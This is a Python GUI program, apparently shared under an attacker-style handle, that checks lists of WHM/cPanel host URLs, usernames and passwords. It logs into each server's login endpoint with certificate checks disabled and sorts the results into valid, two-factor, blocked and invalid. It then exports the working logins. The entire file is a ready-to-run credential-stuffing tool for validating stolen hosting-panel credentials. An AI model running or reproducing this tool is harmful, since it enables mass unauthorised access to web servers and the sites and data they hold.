#!/usr/bin/env python3
import sys, re, requests, urllib3
urllib3.disable_warnings()

from PyQt5.QtWidgets import (
    QApplication, QWidget, QLabel, QPushButton, QTextEdit,
    QFileDialog, QVBoxLayout, QHBoxLayout,
    QProgressBar, QFrame
)
from PyQt5.QtCore import Qt, QThread, pyqtSignal
from PyQt5.QtGui import QFont

class CheckerThread(QThread):
    result = pyqtSignal(str, str)
    finished = pyqtSignal()

    def __init__(self, lines):
        super().__init__()
        self.lines = lines
        self.running = True
        self.pattern = re.compile(r"^(https?:\/\/[^|]+:\d+)\|([^|]+)\|(.+)$")

        self.session = requests.Session()
        self.session.headers.update({
            "User-Agent": "Mozilla/5.0 (Bootstrap WHM Checker)"
        })

    def run(self):
        for line in self.lines:
            if not self.running:
                break

            line = line.strip()
            m = self.pattern.match(line)

            if not m:
                self.result.emit("INVALID", line)
                continue

            base, user, pwd = m.groups()
            url = f"{base}/login/?login_only=1"

            try:
                r = self.session.post(
                    url,
                    data={"user": user, "pass": pwd},
                    timeout=15,
                    verify=False
                )

                if r.status_code == 403:
                    self.result.emit("BLOCKED", line)
                    continue

                if r.status_code != 200:
                    self.result.emit("ERROR", f"{line} | HTTP {r.status_code}")
                    continue

                js = r.json()
                txt = str(js).lower()

                if js.get("status") == 1 and js.get("security_token"):
                    self.result.emit("VALID", line)
                elif "2fa" in txt:
                    self.result.emit("2FA", line)
                else:
                    self.result.emit("INVALID", line)

            except requests.exceptions.Timeout:
                self.result.emit("ERROR", f"{line} | TIMEOUT")
            except Exception as e:
                self.result.emit("ERROR", f"{line} | {e}")

        self.finished.emit()

    def stop(self):
        self.running = False

class WHMBootstrap(QWidget):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("WHM Login Checker BY Z-SH4DOWSPEECH")
        self.resize(1400, 780)

        self.lines = []
        self.total = 0
        self.stats = {k: 0 for k in ["VALID","INVALID","2FA","BLOCKED","ERROR"]}
        self.thread = None

        self.build_ui()

    def build_ui(self):
        self.setStyleSheet("""
        QWidget {
            background:#f4f6f9;
            color:#212529;
            font-family:Segoe UI, Arial;
            font-size:13px;
        }

        QFrame#card {
            background:#ffffff;
            border:1px solid #dee2e6;
            border-radius:10px;
        }

        QPushButton {
            background:#0d6efd;
            color:white;
            border:none;
            padding:10px;
            border-radius:6px;
        }
        QPushButton:hover {
            background:#0b5ed7;
        }
        QPushButton:pressed {
            background:#0a58ca;
        }

        QTextEdit {
            background:#ffffff;
            border:1px solid #ced4da;
            border-radius:6px;
            padding:8px;
        }

        QProgressBar {
            background:#e9ecef;
            border-radius:6px;
            height:16px;
        }
        QProgressBar::chunk {
            background:#0d6efd;
            border-radius:6px;
        }
        """)

        # ===== SIDEBAR =====
        sidebar = QFrame(objectName="card")
        sidebar.setFixedWidth(220)

        side = QVBoxLayout()
        title = QLabel("WHM LOGIN CHECKER")
        title.setFont(QFont("Segoe UI", 14, QFont.Bold))
        title.setAlignment(Qt.AlignCenter)

        side.addWidget(title)
        side.addSpacing(15)

        for text, fn in [
            ("Load File", self.load_file),
            ("Start", self.start),
            ("Stop", self.stop),
            ("Clear", self.clear),
            ("Export Valid", self.export_valid),
        ]:
            b = QPushButton(text)
            b.clicked.connect(fn)
            side.addWidget(b)

        side.addStretch()
        sidebar.setLayout(side)

        header_card = QFrame(objectName="card")
        header_layout = QVBoxLayout()

        header = QLabel("WHM Login Checker BY Z-SH4DOWSPEECH")
        header.setFont(QFont("Segoe UI", 18, QFont.Bold))
        header.setAlignment(Qt.AlignCenter)

        self.lbl_stats = QLabel()
        self.lbl_stats.setAlignment(Qt.AlignCenter)
        self.lbl_stats.setStyleSheet("color:#6c757d;")

        self.progress = QProgressBar()

        header_layout.addWidget(header)
        header_layout.addWidget(self.lbl_stats)
        header_layout.addWidget(self.progress)
        header_card.setLayout(header_layout)

        body_card = QFrame(objectName="card")
        body_layout = QHBoxLayout()

        self.input_box = QTextEdit()
        self.input_box.setPlaceholderText("https://host:2087|username|password")

        self.log_box = QTextEdit()
        self.log_box.setReadOnly(True)

        body_layout.addWidget(self.input_box)
        body_layout.addWidget(self.log_box)
        body_card.setLayout(body_layout)

        main = QVBoxLayout()
        main.addWidget(header_card)
        main.addWidget(body_card)

        root = QHBoxLayout()
        root.addWidget(sidebar)
        root.addLayout(main)

        self.setLayout(root)
        self.update_stats()

    def load_file(self):
        path, _ = QFileDialog.getOpenFileName(self, "Load File", "", "Text Files (*.txt)")
        if path:
            with open(path, encoding="utf-8", errors="ignore") as f:
                self.lines = f.read().splitlines()
            self.input_box.setPlainText("\n".join(self.lines))
            self.total = len(self.lines)
            for k in self.stats: self.stats[k] = 0
            self.update_stats()

    def start(self):
        if not self.lines:
            return
        self.log_box.clear()
        self.thread = CheckerThread(self.lines)
        self.thread.result.connect(self.on_result)
        self.thread.start()

    def stop(self):
        if self.thread:
            self.thread.stop()

    def on_result(self, status, text):
        colors = {
            "VALID": "#198754",
            "INVALID": "#dc3545",
            "2FA": "#ffc107",
            "BLOCKED": "#fd7e14",
            "ERROR": "#b02a37"
        }
        self.stats[status] += 1
        self.log_box.append(
            f'<span style="color:{colors[status]}; font-weight:600;">[{status}] {text}</span>'
        )
        self.update_stats()

    def update_stats(self):
        done = sum(self.stats.values())
        self.lbl_stats.setText(" | ".join(f"{k}: {v}" for k, v in self.stats.items()))
        if self.total:
            self.progress.setValue(int(done / self.total * 100))

    def clear(self):
        self.input_box.clear()
        self.log_box.clear()
        self.lines = []
        self.total = 0
        for k in self.stats: self.stats[k] = 0
        self.update_stats()

    def export_valid(self):
        path, _ = QFileDialog.getSaveFileName(self, "Save Valid", "valid.txt", "Text Files (*.txt)")
        if path:
            data = [l for l in self.log_box.toPlainText().splitlines()
                    if l.startswith("[VALID]")]
            with open(path, "w") as f:
                f.write("\n".join(data))

if __name__ == "__main__":
    app = QApplication(sys.argv)
    win = WHMBootstrap()
    win.show()
    sys.exit(app.exec_())

